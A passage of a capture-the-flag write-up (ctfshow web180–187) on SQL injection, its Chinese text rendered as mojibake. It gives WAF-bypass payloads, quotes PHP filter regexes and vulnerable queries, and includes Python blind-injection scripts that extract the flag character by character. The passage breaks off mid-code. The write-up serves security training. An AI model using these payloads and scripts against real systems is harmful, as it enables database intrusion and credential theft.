class="language-mysql">-1&#39;%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0cusername&#x3D;&#39;flag&#39;or&#39;1&#39;&#x3D;&#39;</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;%0cor%0cusername%0clike%0c&#39;flag</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#39;or&#39;1&#39;&#x3D;&#39;1&#39;--%0c</code></pre><h4 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h4><p>åŒä¸Š</p><h4 id="web182-likeæ¨¡ç³ŠåŒ¹é…"><a href="#web182-likeæ¨¡ç³ŠåŒ¹é…" class="headerlink" title="web182(likeæ¨¡ç³ŠåŒ¹é…)"></a>web182(likeæ¨¡ç³ŠåŒ¹é…)</h4><p>å¢åŠ äº†flagè¿‡æ»¤ã€‚likeå¯ä»¥æ¨¡ç³ŠåŒ¹é…ï¼Œæˆ–è€…åŒä¸Šä¸‡èƒ½å¯†ç </p><p><code>%0c</code>åœ¨æœ¬é¢˜ä¾æ—§å¯ç”¨ã€‚</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39;||(username)like&#39;%fla%</code></pre><p>likeå¯ä»¥ç”¨ä¸¤ä¸ªé€šé…ç¬¦ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼š</p><table><thead><tr><th>å­—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>%</code></td><td>åŒ¹é…ä»»ä½•æ•°ç›®çš„å­—ç¬¦ï¼Œç”šè‡³åŒ…æ‹¬é›¶å­—ç¬¦</td></tr><tr><td><code>_</code></td><td>åªèƒ½åŒ¹é…ä¸€ç§å­—ç¬¦</td></tr></tbody></table><h4 id="web183-å¸ƒå°”ç›²æ³¨"><a href="#web183-å¸ƒå°”ç›²æ³¨" class="headerlink" title="web183(å¸ƒå°”ç›²æ³¨)"></a>web183(å¸ƒå°”ç›²æ³¨)</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(pass) from "</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tableName'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span>      </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>      </code></pre><p>æŸ¥è¯¢ç»“æœ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°</span>      <span class="token variable">$user_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      </code></pre><p>wafåˆå¢åŠ äº†ä¸€äº›ï¼Œé¢˜ç›®ä¹Ÿæœ‰å˜åŒ–äº†ã€‚æŸ¥è¯¢åˆ°çš„ç»“æœä¼šè¿”å›åˆ°ä¸‹é¢ç¬¬ä¸‰ä¸ªç°å—é‚£é‡Œã€‚</p><p>selectä¸èƒ½ç”¨ï¼Œå°±åªèƒ½é€‰æ‹©å¸ƒå°”ç›²æ³¨æˆ–è€…æ—¶é—´ç›²æ³¨äº†ã€‚</p><p>è¿™é¢˜çš„è§£æ³•æ˜¯åœ¨å·²çŸ¥è¡¨åçš„æƒ…å†µä¸‹å®ç°çš„ï¼Œå†ç»“åˆæ¨¡ç³ŠåŒ¹é…likeæˆ–è€…æ­£åˆ™åŒ¹é…regexpã€‚<br>å†™è„šæœ¬å‰å…ˆæµ‹è¯•ä¸€ä¸‹è¯­å¥æ˜¯å¦èƒ½æ­£å¸¸æ‰§è¡Œï¼Œå¯ä»¥çš„è¯ï¼Œå†å†™åˆ°è„šæœ¬é‡Œã€‚</p><p>å› ä¸ºæ¯æ¬¡æŸ¥è¯¢è®°å½•æ€»æ•°éƒ½æ˜¯1æ¡ï¼Œå°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„flagï¼Œæ‰€ä»¥é¡µé¢å›ºå®šä¼šå‡ºç°$user_count &#x3D; 1;ï¼Œå¯ä»¥ç”¨å¸ƒå°”ç›²æ³¨ã€‚</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where&#96;pass&#96;like&#39;ctfshow&#123;%&#39;</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where(substr(&#96;pass&#96;,1,1)regexp(&#39;a&#39;))</code></pre><p>Payloadï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96;where&#96;pass&#96;like&#39;ctfshow&#123;%&#39;</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'https://b2eacc14-603c-45c4-bc2a-0ce02478cc81.challenge.ctf.show/select-waf.php'</span>flag <span class="token operator">=</span> <span class="token string">''</span>flagstr <span class="token operator">=</span> <span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># (1, 46)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"`ctfshow_user`where`pass`like\'ctfshow&#123;&#125;%\'"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag <span class="token operator">+</span> j<span class="token punctuation">)</span>            <span class="token comment"># 'tableName': f'`ctfshow_user`where(substr(`pass`,&#123;i&#125;,1)regexp('&#123;j&#125;'))'</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment"># æœ‰å¹¶å‘æ•°é‡é™åˆ¶çš„é¢˜ç›®ï¼Œå°±ç¡ä¸€æ®µæ—¶é—´</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span></code></pre><h4 id="web184-right-join-having"><a href="#web184-right-join-having" class="headerlink" title="web184(right join   having)"></a>web184(right join   having)</h4><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><code>where</code>ã€<code>&#39; &quot;</code>ã€åå¼•å·è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯æœ¬é¢˜æ²¡æœ‰è¿‡æ»¤ç©ºæ ¼ã€‚</p><p><strong>æ–¹æ³•ä¸€ï¼šï¼ˆç”¨right joinç»•è¿‡è¿‡æ»¤ï¼‰</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;&#96;ctfshow_user&#96; as a right join ctfshow_user as b on substr(b.pass,1,1)regexp(char(46))</code></pre><p>RIGHT JOIN å…³é”®å­—ä»å³è¡¨ï¼ˆtable2ï¼‰è¿”å›æ‰€æœ‰çš„è¡Œï¼Œå³ä½¿å·¦è¡¨ï¼ˆtable1ï¼‰ä¸­æ²¡æœ‰åŒ¹é…ã€‚å¦‚æœå·¦è¡¨ä¸­æ²¡æœ‰åŒ¹é…ï¼Œåˆ™ç»“æœä¸º NULLã€‚</p><p>[right joinèœé¸Ÿæ•™ç¨‹](<a href="https://www.runoob.com/sql/sql-join-right.html">SQL RIGHT JOIN å…³é”®å­— | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a>)</p><p>è¿™é‡Œæ˜¯åˆ†åˆ«å°†ctfshow_ueré‡å‘½åä¸ºaå’Œbï¼Œæ¥ç€åœ¨bä¸­è¿›è¡Œç­›é€‰ï¼Œç„¶åç”¨<code>right join</code>å°†bä¸­ç­›é€‰å‡ºæ¥çš„å€¼ä¸aè¡¨çš„å€¼è¿›è¡ŒåŒ¹é…ã€‚</p><p>è¿™é‡Œç”¨<code>$user_count = 43;</code>ä½œä¸ºç­›é€‰æ¡ä»¶ã€‚</p><p>Y4tackerå¸ˆå‚…çš„ä»£ç </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># @Author:Y4tacker</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://214a3dd9-ba25-480b-bdc0-0f33a1c754d8.challenge.ctf.show/select-waf.php"</span>flag <span class="token operator">=</span> <span class="token string">'ctfshow&#123;'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)regexp(char(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">)))"</span></span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 43;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"."</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"&#125;"</span><span class="token punctuation">:</span>                    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                <span class="token keyword">break</span></code></pre><p><strong>æ–¹æ³•äºŒï¼šï¼ˆwhereç”¨havingä»£æ›¿ï¼Œâ€™ â€œå¯ä»¥ç”¨ ()+Hexä»£æ›¿ï¼‰</strong></p><p>æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œçœ‹çœ‹selectè¯­æ³•ã€‚å‘ç°havingå’Œwhereå¯ä»¥æ›¿æ¢ï¼Œä½†æ˜¯havingè¯­å¥æœ‰ä½¿ç”¨æ¡ä»¶ã€‚</p><blockquote><p>ä¸€ä¸ªHAVINGå­å¥å¿…é¡»ä½äºGROUP BYå­å¥ä¹‹åï¼Œå¹¶ä½äºORDER BYå­å¥ä¹‹å‰ã€‚</p></blockquote><p><a href="https://www.runoob.com/sql/sql-having.html">SQL HAVING å­å¥</a></p><p><img src="web184.png" loading="lazy"></p><p><strong>åå…­è¿›åˆ¶</strong>ï¼šå¯ä»¥å‰é¢åŠ xï¼Œåé¢ç”¨å¼•å·åŒ…è£¹æˆ–è€…0xï¼›ä¹Ÿå¯ä»¥å’Œç®—æ•°è¿ç®—ç»“åˆè¡¨ç¤ºæ•°å­—ã€‚</p><p><img src="web184_2.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">tableName&#x3D;ctfshow_user group by pass having pass like 0x63746673686f777b25  #ctfshow&#123;%</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">"http://24873af7-39c6-4235-85e2-f6433b80f182.challenge.ctf.show/select-waf.php"</span>flagstr<span class="token operator">=</span><span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span>   <span class="token comment">#40</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"ctfshow_user group by pass having pass like 0x63746673686f777b&#123;&#125;25"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token operator">+</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">#print(data)</span>        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment">#æœ‰å¹¶å‘æ•°é‡é™åˆ¶çš„ï¼Œå°±ç¡ä¸€æ®µæ—¶é—´</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>            flag<span class="token operator">+=</span>x            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ctfshow&#123;"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span></code></pre><h4 id="web185-trueç»•è¿‡æ•°å­—"><a href="#web185-trueç»•è¿‡æ•°å­—" class="headerlink" title="web185(trueç»•è¿‡æ•°å­—)"></a>web185(trueç»•è¿‡æ•°å­—)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p>æ•°å­—è¢«banäº†</p><p><img src="web185.png" loading="lazy"></p><p><strong>æ–¹æ³•ä¸€</strong>ï¼šå¯ä»¥ä½¿ç”¨concatæ¥æ‹¼æ¥å­—ç¬¦ä¸²</p><p><img src="web185_2.png" loading="lazy"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">formatString</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">"concat("</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        tip <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">if</span> x <span class="token keyword">in</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>            tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tip <span class="token operator">=</span> <span class="token number">1</span>            temp <span class="token operator">+=</span> <span class="token string">"char("</span>            tmp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">if</span> tmp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            temp <span class="token operator">+=</span> <span class="token string">"false"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            temp_d <span class="token operator">=</span> <span class="token string">"("</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>                temp_d <span class="token operator">+=</span> <span class="token string">"true+"</span>            temp_d <span class="token operator">=</span> temp_d<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">")"</span>            <span class="token keyword">if</span> tip <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                temp_d <span class="token operator">+=</span> <span class="token string">")"</span>            temp <span class="token operator">+=</span> temp_d        temp <span class="token operator">+=</span> <span class="token string">","</span>    temp <span class="token operator">=</span> temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">")"</span>    <span class="token keyword">return</span> temp<span class="token comment"># print(formatString("0x63746673686f777b"))</span>url <span class="token operator">=</span> <span class="token string">"https://8ea77825-d310-4375-b330-8826bf8db1a3.challenge.ctf.show/select-waf.php"</span><span class="token comment"># dicçš„é¡ºåºå¯ä»¥æ”¹ä¸€ä¸‹ï¼æˆ‘æ˜¯æ‡’å¾—æ”¹äº†ï¼æ”¹é¡ºåºå¯ä»¥æé«˜æ•ˆç‡ï¼ï¼ï¼</span>dic <span class="token operator">=</span> <span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow&#123;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> dic<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user group by pass having pass regexp(&#123;&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>formatString<span class="token punctuation">(</span>flag <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token comment"># print(data)</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> x            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment"># print("[--] &#123;&#125; is wrong".format(x))</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[flag]:"</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span></code></pre><p><strong>æ–¹æ³•äºŒ</strong>ï¼šç»§ç»­ä½¿ç”¨right join</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">creatNum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token string">"true"</span>    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> res    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> <span class="token string">"+true"</span>    <span class="token keyword">return</span> resurl <span class="token operator">=</span> <span class="token string">'https://16d50b32-c89c-423e-aa09-841d997cb617.challenge.ctf.show/select-waf.php'</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow&#123;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;&#125;,true)regexp(char(&#123;&#125;)))"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                creatNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> creatNum<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 43;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'.'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\>|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p>å¢åŠ äº†å°–æ‹¬å·ï¼Œ<code>^</code>ã€<code>%</code>çš„è¿‡æ»¤ã€‚<br>ä¸Šé¢˜çš„payloadå¯ç”¨ã€‚</p><h4 id="web187-ffifdyopç»•è¿‡md5"><a href="#web187-ffifdyopç»•è¿‡md5" class="headerlink" title="web187(ffifdyopç»•è¿‡md5)"></a>web187(ffifdyopç»•è¿‡md5)</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from ctfshow_user where username = '<span class="token interpolation"><span class="token variable">$username</span></span>' and password= '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span>      </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åªæœ‰adminå¯ä»¥è·å¾—flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">!=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åä¸å­˜åœ¨'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token 